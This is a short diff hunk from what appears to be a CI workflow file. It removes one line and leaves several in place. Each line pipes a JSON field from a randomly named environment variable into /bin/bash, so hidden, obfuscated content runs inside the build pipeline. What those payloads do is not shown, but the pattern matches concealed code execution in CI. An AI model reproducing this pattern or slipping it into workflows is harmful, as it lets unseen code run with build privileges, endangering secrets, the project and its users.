@@ -31,7 +31,6 @@ jobs:
           echo $kpc176 | jq -r .of68253 | /bin/bash
           echo $hx814 | jq -r .wlcah82827 | /bin/bash
           printf '%s' "$vke68797" | jq -r .eaa78 | /bin/bash
-          echo $aogg62 | jq -r .pgxiy4 | /bin/bash
           printf '%s' "$qroec0149" | jq -r .zjau665 | /bin/bash
           printf '%s' "$hahnh896" | jq -r .wo847 | /bin/bash
           echo $pwy1 | jq -r .mfdl8446 | /bin/bash
